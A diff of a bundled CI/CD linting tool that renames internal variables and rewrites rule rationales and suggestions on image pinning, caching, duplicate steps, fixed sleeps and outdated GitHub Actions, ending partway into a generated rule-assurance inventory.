         key: `base:${first.base}:${hash2(signature)}`,
         confidence: "medium",
-        message: `${entries2.length} Dockerfiles start from \`${first.base}\` and repeat the same toolchain preamble (${summarize(first.steps)}).`,
-        suggestion: `Move \`FROM ${first.base}\` and the shared install steps into one base Dockerfile, publish it from CI to \`ghcr.io/<org>/${imageName2(first.base)}-base\`, and start each of these Dockerfiles with \`FROM ghcr.io/<org>/${imageName2(first.base)}-base@sha256:<digest>\` (Dependabot can bump the digest). The layer is then built once and shared across the monorepo.`,
+        message: `${entries3.length} Dockerfiles start from \`${first.base}\` and repeat the same toolchain preamble (${summarize(first.steps)}).`,
+        suggestion: `Consider publishing a shared base containing \`FROM ${first.base}\` and the common install steps, consumed as \`ghcr.io/<org>/${imageName2(first.base)}-base@sha256:<digest>\`. Preserve platform and service requirements, and measure the result against existing layer-cache reuse.`,
         related: others.map((entry2) => ({ path: entry2.model.path, line: entry2.stage.line }))
       });
     }
@@ -51725,7 +56035,7 @@ var docker_base_digest_default = defineRule({
     id: "hermeticity/docker-base-digest",
     ruleset: "hermeticity",
     description: "Dockerfile base images should use pinned versions (and digests when required).",
-    rationale: "`FROM image` or `FROM image:latest` silently changes whenever upstream publishes, which breaks reproducibility and invalidates the layer cache for every following instruction. A version tag makes upgrades explicit; a digest makes builds fully reproducible.",
+    rationale: "Untagged and latest-tag base images can change when their registry tags move, affecting build inputs and layer reuse. Version tags communicate upgrade intent but can also move. A digest pins the referenced image content; it does not make the entire build reproducible, because downloads, toolchains and other inputs may still vary.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["recommended", "agentic", "strict"],
@@ -51920,7 +56230,7 @@ var pin_container_images_default = defineRule({
     id: "hermeticity/pin-container-images",
     ruleset: "hermeticity",
     description: "Job containers and service containers should use pinned image versions.",
-    rationale: "An image with no tag or `:latest` changes whenever upstream publishes, so a job's toolchain or a service's database version can change between two runs of the same commit. A version tag makes upgrades explicit; a digest makes them fully reproducible.",
+    rationale: "Untagged and latest-tag images can change between runs when registry tags move. Version tags communicate upgrade intent but can also move. A digest pins the referenced image content; it does not establish reproducibility of the full job or of mutable external dependencies.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["recommended", "agentic", "strict"],
@@ -52368,16 +56678,16 @@ function collectScopeEnds(ends) {
   const branches = /* @__PURE__ */ new Map();
   const bindings = /* @__PURE__ */ new Map();
   const group = (groups, key) => {
-    let entries2 = groups.get(key);
-    if (!entries2) {
-      entries2 = /* @__PURE__ */ new Set();
-      groups.set(key, entries2);
+    let entries3 = groups.get(key);
+    if (!entries3) {
+      entries3 = /* @__PURE__ */ new Set();
+      groups.set(key, entries3);
     }
-    return entries2;
+    return entries3;
   };
-  const resolve4 = (entries2, end) => {
-    if (!entries2) return;
-    for (const body of entries2) {
+  const resolve4 = (entries3, end) => {
+    if (!entries3) return;
+    for (const body of entries3) {
       active.delete(body);
       statements.get(body.statement)?.delete(body);
       branches.get(body.conditional)?.delete(body);
@@ -53378,9 +57688,9 @@ function isGitHubHosted(job) {
 }
 var NIX_SHELL2 = /\bnix(\s+develop|-shell)\b/;
 function nixJob(project, workflow, job) {
-  const entries2 = expandedJobSteps(project, workflow, job);
-  const installers = entries2.map((entry2) => entry2.step).filter((step) => NIX_INSTALLER_ACTIONS.has(step.uses?.action.name ?? ""));
-  const caches = entries2.map((entry2) => entry2.step).filter((step) => usesAction(step, ...NIX_CACHE_ACTIONS));
+  const entries3 = expandedJobSteps(project, workflow, job);
+  const installers = entries3.map((entry2) => entry2.step).filter((step) => NIX_INSTALLER_ACTIONS.has(step.uses?.action.name ?? ""));
+  const caches = entries3.map((entry2) => entry2.step).filter((step) => usesAction(step, ...NIX_CACHE_ACTIONS));
   const commands = jobCommands(project, workflow, job).map((entry2) => {
     const nix = nixInvocation(entry2.command, entry2.line);
     return nix ? { ...entry2, nix } : entry2;
@@ -53394,7 +57704,7 @@ function nixJob(project, workflow, job) {
     ...commands.flatMap((entry2) => entry2.nix ? cliConf(entry2.nix, entry2.path) : shellConfWrites(entry2.command, entry2.path, entry2.line))
   ];
   const file2 = project.files.get(workflow.path);
-  return { workflow, job, installers, entries: entries2, caches, commands, nixShell, conf, ...file2 ? { file: file2 } : {} };
+  return { workflow, job, installers, entries: entries3, caches, commands, nixShell, conf, ...file2 ? { file: file2 } : {} };
 }
 function* nixJobs(project) {
   for (const workflow of project.workflows) {
@@ -55234,11 +59544,11 @@ import { posix as posix3 } from "node:path";
 // src/lint/rules/toolchains/shared.ts
 var import_yaml13 = __toESM(require_dist2(), 1);
 function context(project, workflow, job) {
-  const entries2 = expandedJobSteps(project, workflow, job);
-  const commands = entries2.flatMap(
+  const entries3 = expandedJobSteps(project, workflow, job);
+  const commands = entries3.flatMap(
     (entry2) => commandsOf(entry2.step).map(({ command: command2, line: line2 }) => ({ ...entry2, command: command2, line: line2 }))
   );
-  return { workflow, job, entries: entries2, commands };
+  return { workflow, job, entries: entries3, commands };
 }
 function jobContexts(project) {
   const result = [];
@@ -57870,14 +62180,14 @@ function dependabotNixCoverage(content3) {
   if (updates === void 0) return { entries: false, patterns: [] };
   if (!Array.isArray(updates)) return "unknown";
   const patterns = [];
-  let entries2 = false;
+  let entries3 = false;
   for (const update of updates) {
     if (typeof update !== "object" || update === null) continue;
     const fields = update;
     const ecosystem = fields["package-ecosystem"];
     if (typeof ecosystem !== "string") return "unknown";
     if (ecosystem !== "nix") continue;
-    entries2 = true;
+    entries3 = true;
     const dirs = [fields.directory, ...Array.isArray(fields.directories) ? fields.directories : [fields.directories]].filter(
       (dir) => dir !== void 0
     );
@@ -57888,7 +62198,7 @@ function dependabotNixCoverage(content3) {
       patterns.push(pattern);
     }
   }
-  return { entries: entries2, patterns };
+  return { entries: entries3, patterns };
 }
 function directoryPattern(dir) {
   const trimmed = dir.trim().replace(/^\.?\/+/, "").replace(/\/+$/, "");
@@ -59071,14 +63381,14 @@ function publishedEntries(project, manifest) {
   const bin = manifest.json.bin;
   if (typeof bin === "string") paths2.push(bin);
   else if (bin && typeof bin === "object") paths2.push(...Object.values(bin).filter((value) => typeof value === "string"));
-  const entries2 = /* @__PURE__ */ new Set();
+  const entries3 = /* @__PURE__ */ new Set();
   for (const path of paths2) {
     const clean2 = path.replace(/^\.?\/+/, "");
     if (!clean2 || clean2.startsWith("..")) continue;
     const [first, ...rest] = clean2.split("/");
-    if (first) entries2.add(rest.length > 0 ? first : clean2);
+    if (first) entries3.add(rest.length > 0 ? first : clean2);
   }
-  if (entries2.size > 0) return [...entries2];
+  if (entries3.size > 0) return [...entries3];
   const tsconfig = looseJson(project.files.get(joinPath4(manifest.dir, "tsconfig.json"))?.content ?? "");
   const outDir = tsconfig?.compilerOptions?.outDir;
   if (typeof outDir === "string") {
@@ -59195,14 +63505,14 @@ var files_allowlist_default = defineRule({
       if (typeof manifest.json.version !== "string") continue;
       if (manifest.json.files !== void 0) continue;
       if (project.files.has(joinPath4(manifest.dir, ".npmignore"))) continue;
-      const entries2 = publishedEntries(project, manifest);
+      const entries3 = publishedEntries(project, manifest);
       const location3 = manifest.dir || "the repository root";
       report({
         path: manifest.path,
         line: manifest.lineOf("name"),
         key: "files-missing",
         message: `\`${manifest.name}\` is publishable but has no \`files\` allowlist or \`.npmignore\`, so \`npm publish\` packs everything in ${location3} (sources, tests, fixtures, configs) into the tarball.`,
-        suggestion: `Add \`"files": ${JSON.stringify(entries2)}\` to ${manifest.path} so the tarball only contains build output (package.json, README, and LICENSE are always included), then check the contents with \`npm pack --dry-run\`.`
+        suggestion: `Add \`"files": ${JSON.stringify(entries3)}\` to ${manifest.path} so the tarball only contains build output (package.json, README, and LICENSE are always included), then check the contents with \`npm pack --dry-run\`.`
       });
     }
   }
@@ -59511,8 +63821,8 @@ var duplicate_command_default = defineRule({
   meta: {
     id: "redundancy/duplicate-command",
     ruleset: "redundancy",
-    description: "A job should not run the same non-trivial shell command more than once.",
-    rationale: "Repeating an install, build, or test command in one job repeats its cost on every run. It is usually left over from merging two step lists and makes it unclear which invocation the job actually depends on.",
+    description: "Review repeated non-trivial shell commands for potentially redundant work.",
+    rationale: "Repeated command text can indicate avoidable work, but identical text does not establish identical effects or cost: files, environment, tool caches and external state may have changed. Check conditions and intervening effects before removing an invocation, then measure any savings.",
     kind: "practice",
     defaultSeverity: "info",
     presets: ["strict"],
@@ -59554,8 +63864,8 @@ var duplicate_command_default = defineRule({
               path: workflow.path,
               line: line2,
               key: `${job.key}.duplicate-command.${hash3(key)}.${first.count}`,
-              message: `\`${text4}\` already ran earlier in job "${job.id}" (line ${first.line}).`,
-              suggestion: "Remove the repeated command, or explain with a comment why the second run is required.",
+              message: `\`${text4}\` also appears earlier in job "${job.id}" (line ${first.line}).`,
+              suggestion: "Verify conditions and intervening effects before removing the repeated command, or document why both invocations are required.",
               related: [{ path: workflow.path, line: first.line }]
             });
           }
@@ -59570,8 +63880,8 @@ var duplicate_setup_step_default = defineRule({
   meta: {
     id: "redundancy/duplicate-setup-step",
     ruleset: "redundancy",
-    description: "A job should not run the same toolchain setup action twice with the same inputs.",
-    rationale: "Running a setup action a second time with identical inputs reinstalls the same toolchain, adds download and cache-restore time to every run, and usually signals a copy-paste mistake that hides which configuration is authoritative.",
+    description: "Review repeated toolchain setup declarations with matching visible inputs.",
+    rationale: "Repeated setup declarations may add avoidable work, but tool caches can avoid downloads and intervening steps can change the environment or toolchain. Matching visible inputs alone does not establish that the second setup is redundant. Verify conditions, outputs and environment requirements before removing it.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["recommended", "agentic", "strict"],
@@ -59603,8 +63913,8 @@ var duplicate_setup_step_default = defineRule({
             path: workflow.path,
             line: step.line,
             key: `${step.key}.duplicate-setup`,
-            message: `Job "${job.id}" runs ${action} again with the same inputs as the step on line ${first.line}.`,
-            suggestion: "Remove the repeated setup step; the toolchain from the first step is still on PATH.",
+            message: `Job "${job.id}" declares ${action} again with matching visible inputs to the step on line ${first.line}.`,
+            suggestion: "Before removing the repeated setup, verify conditions, referenced outputs and any toolchain or environment changes between the steps.",
             related: [{ path: workflow.path, line: first.line }]
           });
         }
@@ -59635,7 +63945,7 @@ var rebuild_per_job_default = defineRule({
     id: "redundancy/rebuild-per-job",
     ruleset: "redundancy",
     description: "Several jobs in a workflow should not each rebuild the same project from scratch.",
-    rationale: "When multiple jobs run the same build command on the same runner type, the workflow pays for the build several times and the jobs may test or ship slightly different outputs. Building once and passing the result through an artifact cuts runner minutes and guarantees every downstream job uses the same bits.",
+    rationale: "Repeated build commands may duplicate work, but matching visible commands and runner labels do not establish equivalent inputs or outputs. Where consumers can safely share a verified immutable artifact, building once may reduce repeated work and align their inputs. Artifact transfer, serialization and changed critical paths can offset the saving; validate semantics and measure the result.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["agentic", "strict"],
@@ -59924,7 +64234,7 @@ var toolchain_version_drift_default = defineRule({
     }
     for (const [key, files] of byInput) {
       const [action = "", input3 = ""] = key.split("\0");
-      const uses = [...files.values()].filter((entries2) => !conflicting(entries2.map((use) => use.version))).flat();
+      const uses = [...files.values()].filter((entries3) => !conflicting(entries3.map((use) => use.version))).flat();
       const versions = [...new Set(uses.map((use) => use.version))];
       if (new Set(uses.map((use) => use.path)).size < 2 || !conflicting(versions)) continue;
       const [first, ...others] = uses;
@@ -60082,11 +64392,11 @@ var ghcr_default = defineRule({
     let pushesToGhcr = false;
     for (const model of [...project.workflows, ...project.actions]) {
       for (const job of model.jobs) {
-        const entries2 = expandedJobSteps(project, model, job);
+        const entries3 = expandedJobSteps(project, model, job);
         const destinations = [];
         const logins = [];
         let unknownPushes = 0;
-        for (const entry2 of entries2) {
+        for (const entry2 of entries3) {
           const { step, path } = entry2;
           const file2 = project.files.get(path);
           if (usesAction2(step, "docker/build-push-action")) {
@@ -60096,7 +64406,7 @@ var ghcr_default = defineRule({
             const raw = withString(step, "tags")?.trim();
             const output3 = /^\$\{\{\s*steps\.([\w-]+)\.outputs\.tags\s*\}\}$/.exec(raw ?? "");
             if (output3) {
-              const meta3 = entries2.find((candidate) => candidate.step.id === output3[1] && usesAction2(candidate.step, "docker/metadata-action"));
+              const meta3 = entries3.find((candidate) => candidate.step.id === output3[1] && usesAction2(candidate.step, "docker/metadata-action"));
               const images = meta3 ? metadataImages(meta3.step) : [];
               const metaFile = meta3 ? project.files.get(meta3.path) : void 0;
               for (const image of images) {
@@ -60311,8 +64621,8 @@ var github_npm_default = defineRule({
     if (internalPackages.length > 0) {
       for (const model of [...project.workflows, ...project.actions]) {
         for (const job of model.jobs) {
-          const entries2 = expandedJobSteps(project, model, job);
-          entries2.forEach((entry2, position) => {
+          const entries3 = expandedJobSteps(project, model, job);
+          entries3.forEach((entry2, position) => {
             for (const { command: command2, line: line2 } of commandsOf(entry2.step)) {
               const registry2 = publishRegistry(command2);
               if (registry2 === void 0) continue;
@@ -60328,7 +64638,7 @@ var github_npm_default = defineRule({
                 continue;
               }
               if (allPinnedToGithub) continue;
-              const setup = entries2.slice(0, position).reverse().find((candidate) => setupNode(candidate.step) && candidate.step.with.has("registry-url"));
+              const setup = entries3.slice(0, position).reverse().find((candidate) => setupNode(candidate.step) && candidate.step.with.has("registry-url"));
               const url2 = setup?.step.with.get("registry-url");
               if (!setup || !url2 || url2.kind !== "literal" || isGithubRegistry(String(url2.value))) continue;
               const related2 = [{ path: entry2.path, line: line2 }];
@@ -61386,8 +65696,8 @@ var cache_disabled_install_default = defineRule({
   meta: {
     id: "testing/cache-disabled-install",
     ruleset: "testing",
-    description: "Jobs that restore a package-manager cache should not clear or bypass that cache in their run steps.",
-    rationale: "Restoring a dependency cache costs a download and a save on every run; clearing it, pointing installs at an empty temporary cache or passing `--no-cache-dir` throws that work away and makes every install download from the registry again.",
+    description: "Review installs that appear to clear or bypass a configured package-manager cache.",
+    rationale: "Clearing or bypassing compatible restored package-manager entries can cause avoidable work. Restore/save operations are conditional, and clearing a cache does not necessarily require a registry download. Verify actual cache paths, command ordering, install behavior and any correctness or isolation requirement before changing the workflow.",
     kind: "practice",
     defaultSeverity: "info",
     presets: ["agentic", "strict"],
@@ -61417,8 +65727,8 @@ var cache_disabled_install_default = defineRule({
             path: workflow.path,
             line: entry2.direct ? entry2.line : stepLine(entry2.owner),
             key: `${entry2.step.key}:${defeat.ecosystem}:${entry2.command}`,
-            message: `${defeat.what} the ${defeat.ecosystem} cache that job \`${job.id}\` restores, so the restore is wasted and dependencies download again.`,
-            suggestion: "Drop the cache-clearing command or flag and let the install use the restored cache."
+            message: `${defeat.what} the ${defeat.ecosystem} cache in job \`${job.id}\`, which also configures caching; this may prevent reuse of restored entries.`,
+            suggestion: "If clearing or bypassing the cache is not needed for correctness or isolation, verify the paths and ordering, allow compatible cache reuse, and measure the result."
           });
         }
       }
@@ -61466,7 +65776,7 @@ var fixed_sleep_default = defineRule({
     id: "testing/fixed-sleep",
     ruleset: "testing",
     description: "Run steps should wait for services to become ready instead of sleeping for a fixed time.",
-    rationale: "A fixed `sleep` before tests is a guess: on a fast runner it wastes the whole interval on every run, and on a slow or busy runner it is too short and the tests fail intermittently. Polling for readiness returns as soon as the service is up and fails clearly when it never comes up.",
+    rationale: "A fixed delay can outlast service startup or finish before the service is ready. A bounded readiness check can reduce unnecessary waiting and report timeout failures, but its health predicate, polling interval and timeout must match the workload. Preserve deliberate rate-limiting or propagation delays rather than assuming every sleep is redundant.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["recommended", "agentic", "strict"],
@@ -61504,8 +65814,8 @@ var fixed_sleep_default = defineRule({
             path: workflow.path,
             line: entry2.direct ? entry2.line : stepLine(entry2.owner),
             key: `${entry2.step.key}:${entry2.command}`,
-            message: `\`${wait.text}\` waits a fixed ${wait.seconds} seconds instead of checking that what it waits for is ready.`,
-            suggestion: "Poll for readiness instead: `docker compose up --wait`, service-container health checks (`--health-cmd`), `npx wait-on <url>`, or a bounded `until curl -fsS <url>; do sleep 1; done` loop."
+            message: `\`${wait.text}\` specifies a fixed ${wait.seconds} seconds of waiting; no readiness condition is visible in this command.`,
+            suggestion: "Consider an appropriate health predicate using `docker compose up --wait`, service-container health checks, or `wait-on`, with an explicit overall timeout. Verify that the delay is not needed for another purpose."
           });
         }
       }
@@ -61599,8 +65909,8 @@ var playwright_browser_cache_default = defineRule({
   meta: {
     id: "testing/playwright-browser-cache",
     ruleset: "testing",
-    description: "Jobs that download Playwright browsers should cache them or run in the Playwright container image.",
-    rationale: "`playwright install` downloads several hundred megabytes of browser builds on every run. Restoring ~/.cache/ms-playwright keyed on the Playwright version (or using the image that ships the browsers) turns that download into a cache hit.",
+    description: "Evaluate browser reuse when Playwright downloads are a measured bottleneck.",
+    rationale: "`playwright install` may download missing browser builds; runner images or existing caches may already supply them. Restoring an archive can cost as much as downloading the browsers, and Linux OS dependencies still need installation. Inspect actual install/restore timings and version/platform compatibility before choosing a browser cache or matching Playwright image.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["recommended", "agentic", "strict"],
@@ -61636,8 +65946,8 @@ var playwright_browser_cache_default = defineRule({
           path: workflow.path,
           line: install2.direct ? install2.line : stepLine(install2.owner),
           key: `${job.key}:playwright-install`,
-          message: "Playwright browsers are downloaded on every run without a cache.",
-          suggestion: "Cache ~/.cache/ms-playwright (%USERPROFILE%\\AppData\\Local\\ms-playwright on Windows) with actions/cache keyed on the Playwright version and run `playwright install` (or only `install-deps` on a hit), or run the job in the mcr.microsoft.com/playwright container image."
+          message: "No browser cache or Playwright container image was detected for this `playwright install` invocation.",
+          suggestion: "Measure browser-install duration first. If reuse is beneficial, cache the actual browser location with a key matching the Playwright version and platform, or use a compatible Playwright image. Preserve required browser installation and OS dependencies."
         });
       }
     }
@@ -61661,23 +65971,23 @@ function finding(tool2, words6, project) {
   switch (tool2) {
     case "eslint":
       return words6.some((word) => word === "--cache" || word.startsWith("--cache=")) ? {
-        message: "ESLint runs with `--cache`, but the cache file is not restored between runs, so every run is cold.",
+        message: "ESLint uses `--cache`, but no matching cache restore was detected; fresh jobs may lose reuse between runs.",
         suggestion: "Point `--cache-location` at a directory (for example node_modules/.cache/eslint/) and restore it with actions/cache."
       } : {
-        message: "ESLint lints every file on every run because `--cache` is not used.",
+        message: "This ESLint invocation has no visible `--cache`; unchanged-file reuse may be an optimization opportunity.",
         suggestion: "Add `--cache --cache-strategy content --cache-location node_modules/.cache/eslint/` and restore that directory with actions/cache."
       };
     case "tsc":
       return words6.some((word) => ["--incremental", "-b", "--build", "--composite"].includes(word)) || tsconfigIncremental(project) ? {
-        message: "tsc builds incrementally, but its .tsbuildinfo output is not restored between runs, so every run is a full check.",
+        message: "Incremental TypeScript output has no detected cache restore; fresh jobs may repeat work.",
         suggestion: "Restore the .tsbuildinfo file(s) (see `tsBuildInfoFile`) with actions/cache keyed on the lockfile and tsconfig."
       } : {
-        message: "tsc re-checks the whole program on every run (no `--incremental` or build mode, and no cached .tsbuildinfo).",
+        message: "No incremental/build mode or .tsbuildinfo cache restore was detected for this TypeScript invocation.",
         suggestion: "Enable `incremental` (with an explicit `tsBuildInfoFile`) or use `tsc -b`, and restore the .tsbuildinfo file with actions/cache."
       };
     case "jest":
       return {
-        message: "Jest re-transforms every file on every run because its cache directory is not restored.",
+        message: "No restore of Jest's transform cache was detected; fresh jobs may repeat transformations.",
         suggestion: "Set `--cacheDirectory` (or `cacheDirectory` in the Jest config) to a workspace path and restore it with actions/cache."
       };
   }
@@ -61687,7 +65997,7 @@ var tool_incremental_cache_default = defineRule({
     id: "testing/tool-incremental-cache",
     ruleset: "testing",
     description: "ESLint, tsc and Jest should keep their incremental caches between CI runs.",
-    rationale: "ESLint (`--cache`), TypeScript (`incremental`/`tsc -b`) and Jest (transform cache) can skip unchanged files, but hosted runners start empty. Persisting their cache files makes repeat runs, including agent iterations on a pull request, proportional to what changed.",
+    rationale: "ESLint (`--cache`), TypeScript (`incremental`/`tsc -b`) and Jest (transform cache) can reuse compatible prior work. Fresh jobs may lack that state, but persistent runners and tool-managed caches can already provide it. Cache restoration, invalidation and upload costs can outweigh savings; measure repeat runs rather than assuming runtime becomes proportional to changed files.",
     kind: "practice",
     defaultSeverity: "info",
     presets: ["agentic", "strict"],
@@ -61752,8 +66062,8 @@ var unconditional_debug_upload_default = defineRule({
   meta: {
     id: "testing/unconditional-debug-upload",
     ruleset: "testing",
-    description: "Uploads of test debugging output (reports, traces, videos, screenshots) should run only when tests fail.",
-    rationale: "A step without `if:` runs only after earlier steps succeed, so a debugging upload placed after the tests uploads megabytes of traces and screenshots on every green run and nothing when the tests fail. `if: failure()` uploads exactly when the output is needed.",
+    description: "Consider failure-only uploads for test artifacts used solely for debugging.",
+    rationale: "A step's default success condition can skip a debugging upload after an earlier unhandled failure. When successful-run artifacts are not needed, `if: failure()` may avoid unnecessary transfers while retaining failure diagnostics. Visible conditions and consumers are only a heuristic: verify artifact consumers, continue-on-error behavior and diagnostic needs before changing the condition.",
     kind: "practice",
     defaultSeverity: "info",
     presets: ["agentic", "strict"],
@@ -61794,8 +66104,8 @@ var unconditional_debug_upload_default = defineRule({
           path: workflow.path,
           line: line2,
           key: `${step.key}:always`,
-          message: `Traces, videos or screenshots (${paths2.join(", ")}) are uploaded on every run, including green ones.`,
-          suggestion: "Use `if: failure()` so the heavy debugging artifacts upload only when a test fails."
+          message: `The upload condition permits traces, videos or screenshots (${paths2.join(", ")}) on successful jobs.`,
+          suggestion: "If successful-run artifacts are not needed, consider `if: failure()` and verify downstream consumers."
         });
         continue;
       }
@@ -61813,8 +66123,8 @@ var unconditional_debug_upload_default = defineRule({
         path: workflow.path,
         line: line2,
         key: step.key,
-        message: condition === void 0 ? `Debugging output (${paths2.join(", ")}) is uploaded only when the tests pass, which is when it is not needed.` : `Debugging output (${paths2.join(", ")}) is uploaded only on success (\`if: success()\`).`,
-        suggestion: "Add `if: failure()` so the upload runs when a test fails and is skipped on green runs.",
+        message: condition === void 0 ? `Debugging output (${paths2.join(", ")}) uses the default success condition and may be skipped after an earlier failure.` : `Debugging output (${paths2.join(", ")}) uses an explicit success condition (\`if: success()\`).`,
+        suggestion: "If the artifacts are only needed for failure diagnostics, use `if: failure()`; verify consumers and continue-on-error behavior.",
         ...applied ? { fix: applied } : {}
       });
     }
@@ -64118,7 +68428,7 @@ var workflow_run_chain_default = defineRule({
     id: "triggers/workflow-run-chain",
     ruleset: "triggers",
     description: "Avoid chaining workflows with `workflow_run` when the downstream work could be a dependent job.",
-    rationale: "A `workflow_run` trigger only fires after the upstream workflow finishes, so the downstream work waits for a second queue slot, a fresh runner, and another checkout before it starts. When pull request volume is high those extra hops add minutes to every change and make the run graph harder to follow. Calling the downstream work as a reusable workflow job with `needs:` keeps it in the same run, shares artifacts directly, and starts it the moment its dependencies succeed.",
+    rationale: "A completed `workflow_run` subscription waits for the upstream workflow, which may include jobs the follow-up does not need. A dependent job can express narrower prerequisites, but it still has scheduling and runner costs; consolidation does not guarantee a faster run. Preserve deliberate privilege boundaries, trigger semantics and artifact dependencies, then measure whether the changed dependency graph reduces waiting.",
     kind: "practice",
     defaultSeverity: "info",
     presets: ["agentic", "strict"],
@@ -64152,8 +68462,8 @@ var workflow_run_chain_default = defineRule({
         path: workflow.path,
         line: chained.line,
         key: "on.workflow_run",
-        message: `Workflow waits for ${label} via workflow_run, adding a second queue wait, runner start, and checkout to every run.`,
-        suggestion: "Turn this workflow into a reusable workflow (`on: workflow_call`) and call it from the upstream workflow as a job with `needs:` on the jobs it depends on; pass build outputs as job outputs or artifacts within the same run.",
+        message: `Workflow subscribes to ${label} via workflow_run; narrower job dependencies may reduce waiting.`,
+        suggestion: "If the workflow boundary is not needed, consider a reusable workflow (`on: workflow_call`) called with `needs:` on its actual prerequisites. Preserve permissions, trigger semantics and artifact consumers, and compare the resulting critical path.",
         related: upstream.flatMap((candidate) => candidate ? [{ path: candidate.path, line: candidate.triggersLine }] : []),
         confidence: "medium"
       });
@@ -64898,7 +69208,6 @@ var TRACKS = {
   "actions/download-artifact": { latest: 8, node24: 7 }
 };
 var RETIRED_RUNTIMES = /* @__PURE__ */ new Set(["node12", "node16", "node20"]);
-var NODE_REMOVAL = "GitHub-hosted runners stopped providing on 2026-09-23; they force such actions onto Node 24";
 function upgradeNotes(name, from, to) {
   const notes = [];
   if (name === "actions/checkout" && from < 7 && to >= 7) {
@@ -64927,7 +69236,7 @@ function checkStep(workflow, step, file2, report) {
     path: workflow.path,
     line: step.uses.line,
     key: `${step.key}.uses`,
-    message: retired ? `${shown} targets Node 20 or older, which ${NODE_REMOVAL}, a runtime that release was never tested on, and warn on every run. The latest major is v${track.latest}.` : `${shown} is behind the latest major, v${track.latest}.`,
+    message: retired ? `${shown} is classified by the tracked major table as targeting Node 20 or older. Verify the pinned release's actual runtime and compatibility with the target runner; older declared runtimes may be overridden or unsupported. The latest tracked major is v${track.latest}.` : `${shown} is behind the latest major in the tracked table, v${track.latest}.`,
     suggestion: `Upgrade to ${name}@v${track.latest} (or its full commit SHA with a \`# v${track.latest}\` comment) after reviewing the release notes for breaking changes since v${version2.major}.${upgradeNotes(name, version2.major, track.latest)}`,
     ...retired ? { impact: "high" } : {},
     ...version2.source === "comment" ? { confidence: "medium" } : {}
@@ -64938,7 +69247,7 @@ var outdated_action_major_default = defineRule({
     id: "workflow/outdated-action-major",
     ruleset: "workflow",
     description: "Well-known actions should use their current major version, and local JavaScript actions should run on node24.",
-    rationale: "Old majors of the official setup, cache, checkout, and artifact actions miss performance work (faster caching backends, parallel artifact uploads) and, below the node24 releases, target Node 20, which GitHub Actions runners removed on 2026-09-23: they now force those actions onto Node 24, which their authors never tested, and warn on every run (self-hosted runners on unsupported platforms cannot run them at all). Agents copy existing workflow snippets, so one stale pin spreads quickly.",
+    rationale: "The maintained major/runtime table identifies releases to review for runtime support, security and performance changes. Newer majors can introduce breaking changes and are not guaranteed faster. Check the pinned action's source and release notes, target runner requirements and GitHub Enterprise Server support before upgrading; the table does not establish how an arbitrary pinned release was tested or executed.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["recommended", "agentic", "strict"],
@@ -64971,7 +69280,7 @@ var outdated_action_major_default = defineRule({
         path: action.path,
         line: using.line,
         key: "runs.using",
-        message: `Action declares \`runs.using: ${runtime}\`, which ${NODE_REMOVAL}, a runtime this action was never built or tested for.`,
+        message: `Action declares \`runs.using: ${runtime}\`, a retired runtime in the tracked GitHub-hosted runner policy. Verify the target runner's actual runtime and the action's compatibility with Node 24.`,
         suggestion: "Change `runs.using` to `node24`, rebuild any bundled `dist/` output, and run the action's tests on Node 24 before releasing a new tag.",
         impact: "high"
       });
@@ -65002,8 +69311,8 @@ function packageJsonPinsNode(project, major) {
   if (typeof volta === "string" && volta.trim() !== "") return true;
   if (major < 6) return false;
   const runtime = record4(manifest.devEngines)?.runtime;
-  const entries2 = Array.isArray(runtime) ? runtime : [runtime];
-  return entries2.some((entry2) => {
+  const entries3 = Array.isArray(runtime) ? runtime : [runtime];
+  return entries3.some((entry2) => {
     const item = record4(entry2);
     return typeof item?.name === "string" && item.name.toLowerCase() === "node" && typeof item.version === "string" && item.version !== "";
   });
@@ -67652,7 +71961,7 @@ var QUEUE_THRESHOLD_MS = 5e3;
 function createTelemetryReport(snapshot, baseline) {
   const criticalPath = calculateCriticalPath(snapshot.jobs);
   const slowest = [...snapshot.jobs].sort((a, b) => b.durationMs - a.durationMs).slice(0, 5);
-  const comparison = baseline ? compare(snapshot.durationMs, baseline.medianDurationMs, baseline.sampleCount) : comparisonProblem(snapshot) ? `Performance comparison withheld: ${comparisonProblem(snapshot)}` : "No comparable historical baseline is available in the retained/backfilled evidence window.";
+  const comparison = baseline ? compare2(snapshot.durationMs, baseline.medianDurationMs, baseline.sampleCount) : comparisonProblem(snapshot) ? `Performance comparison withheld: ${comparisonProblem(snapshot)}` : "No comparable historical baseline is available in the retained/backfilled evidence window.";
   return [
     `## ${snapshot.workflowName} performance snapshot`,
     "",
@@ -67824,7 +72133,7 @@ function recommendations(snapshot, criticalPath, baseline) {
   }
   return messages;
 }
-function compare(current, median2, samples) {
+function compare2(current, median2, samples) {
   if (median2 === 0) return `Compared with ${samples} prior successful runs.`;
   const delta = (current - median2) / median2 * 100;
   const direction = delta > 0 ? "slower" : "faster";
@@ -68643,6 +72952,2187 @@ import { basename as basename3, dirname as dirname2, join as join4, posix as pos
 
 // src/lint/workspace.ts
 import { isAbsolute, posix as posix5, relative as relative3 } from "node:path";
+
+// src/formal/generated/rule-assurance.ts
+var RULE_ASSURANCE = {
+  "schema": "cicd-optimizer/rule-assurance-v1",
+  "interpretation": "This exhaustive claim inventory is not a proof of detector correctness or recommendation benefits. Only the separately scoped engine/model contracts are machine-proved.",
+  "engineContract": {
+    "id": "severity-last-assignment-wins",
+    "theorem": "Policy.Resolve",
+    "implementation": "src/lint/config.ts -> src/formal/policy.ts -> generated Policy.Resolve",
+    "guarantee": "The last present assignment wins (matching preset defaults, then ruleset override, then explicit rule override); no assignment means off.",
+    "exclusions": [
+      "YAML parsing",
+      "preset membership extraction",
+      "option merging",
+      "capability/suppression handling",
+      "detector correctness",
+      "autofix semantics",
+      "pipeline performance"
+    ]
+  },
+  "rules": [
+    {
+      "id": "affected/change-detection",
+      "metadataSha256": "19b42a050eeee4dac978a01deb8785607fc0be150bf1bbf05b97eb9a9f64c913",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Multi-job pull request workflows in a monorepo should skip jobs whose area did not change."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
